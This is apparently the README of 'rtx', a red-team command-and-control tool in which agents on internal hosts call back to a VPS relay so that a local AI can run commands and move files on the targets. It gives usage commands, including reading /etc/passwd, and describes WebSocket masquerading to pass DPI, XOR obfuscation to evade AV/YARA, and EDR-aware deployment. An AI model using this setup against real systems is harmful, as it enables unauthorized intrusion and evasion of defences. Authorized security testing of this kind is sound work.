# rtx — Reverse RPC Remote Executor

**English | [中文](README_ZH.md)**

A **reverse-RPC remote executor** that lets your local AI / terminal operate on inner-network / isolated target machines (reachable only via deployed agents) as if they were local — run commands, read/write files, transfer data.

> ## ⚠️ Disclaimer
>
> This tool is **for authorized security testing / red-team exercises / CTF competitions / defensive security research and learning ONLY**.
> You must:
> - Obtain **explicit written authorization** from the target system owner beforehand;
> - Strictly comply with the authorized scope and applicable laws and regulations;
> - Bear full responsibility for any direct or indirect consequences of using this tool.
>
> The author is not responsible for any unauthorized use, misuse, or illegal activity. Do not use this tool for any unlawful purpose.
> If you do not agree with these terms, do not download, use, or distribute this tool.

## What problem does it solve?

When attacking multi-layer networks / isolated segments, your local machine often cannot reach the target directly — only already-deployed inner-network machines (jump hosts) can. The traditional approach is manually chaining `proxychains`, uploading tools, and shuttling files back and forth. rtx turns "execute on a remote machine" into a first-class capability:

```
Local (AI / brain)                VPS (relay server)               Inner-network target (agent)
  ├─ SSH tunnel → control API      ├─ accepts agent callbacks      ├─ reverse connection
  └─ rtxctl / rtx_* tools ──────▶  └─ task routing ──────────────▶ └─ native command execution
```

**Design highlights**:
- **Brain outside, executor inside**: API keys / model inference never land on the inner network; agents don't need outbound access to model APIs
- **Executor is a 3MB static binary**: pure Go standard library (zero third-party deps), cross-platform (Linux / Windows / macOS / ARM)
- **Reverse RPC**: agents dial out, punching through NAT and multi-hop tunnels, with automatic reconnection (random jitter)
- **Remote execution for AI**: agents act as AI execution endpoints — commands run natively on the target (Linux= bash / Windows= cmd), results return locally

## Components

| Component | Description |
|---|---|
| `agent` | Executor: dials back to server, handles exec/read/write/list/info/upload/download/kill; callbacks via TCP/TLS/ws/wss; Windows build embeds busybox (Unix-syntax exec) |
| `server` | Controller: agent registry + control HTTP API + task routing |
| `rtx` | CLI: dispatch tasks through the control API |
| `rtxctl` | Convenience wrapper: token management, default agent, enter/exit/connect (TUI node picker) |
| `rtx_ui.py` | Node connection picker (VS Code Remote-style TUI) |
| `rtx_mcp_server.py` | Claude Code / MCP client tools (rtx_ls/rtx_enter/rtx_exec/...) |

## Quick start

```bash
# Build (pure standard library, no third-party deps)
go build -ldflags="-s -w" -trimpath -o bin/server ./cmd/server
go build -ldflags="-s -w" -trimpath -o bin/rtx ./cmd/rtx
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o bin/agent-linux-amd64 ./cmd/agent

# 1. Start server on a public VPS (relay controller)
#    :9000 accepts agent callbacks (public — open in cloud security group); control API binds 127.0.0.1 only
./server -l :9000 -t <strong-random-token> --ctrl 127.0.0.1:9001

# 2. Local tunnel to the control API
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>

# 3. Deploy agent on the inner-network machine (zero-dependency, upload and run; see bin/ for platforms)
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <unique-host-name> -q

# TLS channel (v1.1, recommended when agents dial the public server directly):
#   add -tls to server (auto-generates cert & prints pin fp); agent dials with -tls -pin <fp>
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server-fp>

# WebSocket callback (v1.2, for HTTP-whitelist/DPI egress):
#   server: add -wsl :19080 (-tls makes it wss); agent dials with -c ws:// or -c wss://
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -wsl :19080
./agent -c ws://<vps>:19080 -t <token> -i <name>          # ws (plaintext)
./agent -c wss://<vps>:19080 -t <token> -tls -pin <fp>    # wss (TLS)

# 4. Operate locally (rtxctl wraps token / default agent)
rtxctl connect          # TUI picker → enter an execution environment
rtxctl ls               # list online agents
rtxctl exec -cmd "whoami"
rtxctl read -path /etc/passwd
rtxctl upload -path /tmp/x -file ./local
```

## Practical chain: local model + inner-network target + VPS relay (most common)

AI runs locally (keys/inference stay local), the target is on an inner network (only reachable by deployed agents), and a public VPS relays control. **Inference and control are two independent flows**: inference dials the public model API directly from local; control goes through the VPS relay (the VPS only runs the server — no model, no keys).

```
Local AI ──model API──▶ public (inference, not via VPS)
Local AI ─SSH tunnel─▶ VPS server ─▶ inner agent ─▶ target exec (control, via VPS)
```

### Setup (5 steps)

```bash
# 1) Run server on VPS (C2 relay) — open port 9000 in the cloud security group
TOKEN=$(openssl rand -hex 16)
./server-linux-amd64 -l :9000 -t "$TOKEN" --ctrl 127.0.0.1:9001   # add -tls to encrypt, -wsl :9080 for WS
# 2) Reach the control API from local
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
# 3) Configure locally
rtxctl init --ctrl http://127.0.0.1:9001 --token "$TOKEN"
# 4) Deploy the agent on the inner-network target (single file, pick arch)
./agent -c <vps>:9000 -t "$TOKEN" -i <name> -tls -pin <server-fp> -q
# 5) Operate from local (AI uses rtx_* tools / rtxctl against the inner machine)
rtxctl ls && rtxctl exec -cmd "whoami"
```

Agent callback mode by egress: **TCP** (default) / **TLS** (`-tls -pin`) / **ws|wss** (HTTP-whitelist/DPI, `-c ws://`); multi-hop inner networks use Stowaway port delivery and the agent dials the nearest hop. Windows agents embed busybox (Unix syntax).

### Troubleshooting
- `rtxctl ls` empty → check the local tunnel, VPS server, token
- agent offline → check inner-network egress to VPS, token, TLS pin
- model not working → unrelated to rtx; check local→model-API connectivity (independent flow)

## Remote reachability scenarios

- Local machine can't reach the target but an online agent can → deploy the agent on the reachable host; all AI operations are tunneled there
- Multi-layer inner networks → agents dial back via tunnel port-forwarding / SOCKS5 (`-proxy`)
- AI integration → Claude Code MCP (`rtx_mcp_server.py`), AI calls rtx_* tools to execute on agents

## Build artifacts

~3MB per platform: darwin / linux-amd64 / linux-arm64 / windows-amd64 / windows-arm64
(`-ldflags="-s -w"` + CGO=0 + pure standard library)

## Security

- Control API binds 127.0.0.1 only (accessed locally via SSH tunnel)
- Agent registration requires token authentication
- **TLS channel (v1.1)**: server `-tls` self-signed cert + agent `-tls -pin <fp>` certificate pinning
- **Static hardening (v1.1)**: neutral module path, XOR-obfuscated key strings, silenced help text
- Operational note: on EDR-monitored hosts, deploy agents through legitimate channels; kill and clean up residuals afterwards

## Changelog

### v1.2 (2026-09)
- **Self-contained WebSocket callback (`ws://` / `wss://`)**: agents masquerade as HTTP/WebSocket traffic without any extra tunnel tool on the target — pierces HTTP-whitelist/DPI egress; wss (WS over TLS, reusing `-tls -pin` cert pinning) provides encryption. Multi-hop inner networks can still layer Stowaway port delivery.
- **Windows agent embeds busybox**: run commands with **Unix syntax** on Windows targets (`ls`/`cat`/`grep`/`sed`/`wget`/pipes/`for` loops); paths use `C:/forward-slash` (`$TEMP` works) instead of low-level PowerShell/cmd; native Windows exes (`ipconfig`/`netstat`...) transparently run through busybox sh.
- **Execution semantics fix**: removed the bridge to the local Kali execution backend in `rtxctl` — agent commands always run in the agent's **native OS** (Linux=bash / Windows=busybox sh or cmd), no longer assuming Kali semantics; use the local Kali environment for Kali toolchains.

### v1.1 (2026-09)
- **TLS channel**: server `-tls` auto-generates a self-signed cert and prints its fingerprint (`pin(fp)`); agent dials with `-tls -pin <fp>` (certificate pinning against MITM/sniffing). Recommended when agents connect to the public server directly.
- **Static hardening** (reduce AV/YARA signature surface):
  - neutralized Go module path (no project identifier in binaries)
  - XOR-obfuscated key strings (shell path / error strings / protocol markers), decrypted at runtime
  - silenced flag help text
- **Docs**: added `README_EN.md`

### v1.0 (initial)
- Reverse-RPC executor: agent / server / rtx CLI / rtxctl / rtx_ui (TUI node picker)
- Multi-platform static binaries (linux/windows/darwin, amd64/arm64)

## Credits

- Thanks to [lanyi1998](https://github.com/lanyi1998) — the connection-picker UI of `rtxctl connect` is inspired by his [pi-remote](https://github.com/lanyi1998/pi-remote) project (the "Saved remote connections" interaction paradigm).

## License

MIT
